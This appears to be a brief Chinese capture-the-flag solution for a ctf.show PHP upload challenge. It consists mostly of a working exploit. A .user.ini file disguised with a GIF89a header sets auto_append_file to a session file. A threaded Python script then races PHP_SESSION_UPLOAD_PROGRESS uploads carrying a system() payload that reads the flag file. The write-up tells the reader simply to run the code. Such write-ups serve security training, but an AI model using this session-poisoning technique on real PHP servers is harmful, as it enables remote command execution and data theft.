![[Pasted image 20260521135248.png]]

传入.user.ini
内容：GIF89a auto_append_file=/tmp/sess_zho

`import re`  
`import  requests`  
`import threading`  
`import urllib3`  
`urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)`  
  
  
`url1="https://ba75f5ef-6391-4662-ad6f-e75ef59534f8.challenge.ctf.show/"`  
`url2="https://ba75f5ef-6391-4662-ad6f-e75ef59534f8.challenge.ctf.show/upload"`  
`se=requests.Session()`  
`file={`  
    `'file':'111'`  
  
`}`  
`date = {`  
    `'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("tac ../f*");?>'  # 使用system函数执行命令`  
`}`  
`sess='zho'`  
`cookie={`  
`'PHPSESSID': 'zho'`  
`}`  
`def upload_file():`  
    `while True:`  
       `se.post(url1,data=date,cookies=cookie,files=file,verify=False)`  
  
  
  
`def check_flag():`  
    `while True:`  
        `text=se.get(url2,verify=False)`  
        `if 'flag'in text.text:`  
            `flag = re.search(r'ctfshow{.+}', text.text)`  
            `print(flag)`  
  
`threads = [`  
    `threading.Thread(target=upload_file),`  
    `threading.Thread(target=check_flag)`  
`]`  
`for t in threads:`  
    `t.start()`


执行代码即可